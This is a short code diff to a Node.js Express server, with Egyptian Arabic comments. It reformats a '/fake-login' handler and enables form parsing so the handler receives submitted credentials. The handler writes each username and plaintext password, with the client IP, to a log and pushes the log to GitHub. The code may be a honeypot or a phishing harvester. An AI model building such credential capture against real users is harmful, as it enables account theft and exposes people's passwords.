@@ -20,6 +20,10 @@ if (!GITHUB_TOKEN) {
     process.exit(1);
 }
 
+
+app.use(bodyParser.urlencoded({ extended: true }));
+
+
 app.use(cors({ origin: "*" }));
 app.use(bodyParser.json());
 // استجابة خاصة للروت الرئيسي
@@ -85,13 +89,20 @@ app.post('/api/logs', (req, res) => {
 
 app.post('/fake-login', (req, res) => {
     const { username, password } = req.body;
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress?.replace('::ffff:', '') || 'unknown';
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+               req.socket.remoteAddress?.replace('::ffff:', '') || 'unknown';
     const timestamp = new Date().toISOString();
+
     const logLine = `${timestamp},${ip},POST,login attempt,manual,username=${username},password=${password}\n`;
     fs.appendFileSync(logPath, logLine);
-    pushToGitHub(); // لو عايز ترفع التحديثات
-    res.sendFile(path.join(process.cwd(), 'public', 'fake_login.html')); // ترجع الصفحة الفيك
+
+    // لو عايز ترفع التغييرات لـ GitHub
+    pushToGitHub();
+
+    // ترجع الصفحة الفيك تاني
+    res.sendFile(path.join(process.cwd(), 'public', 'fake_login.html'));
 });
+
 
 
 
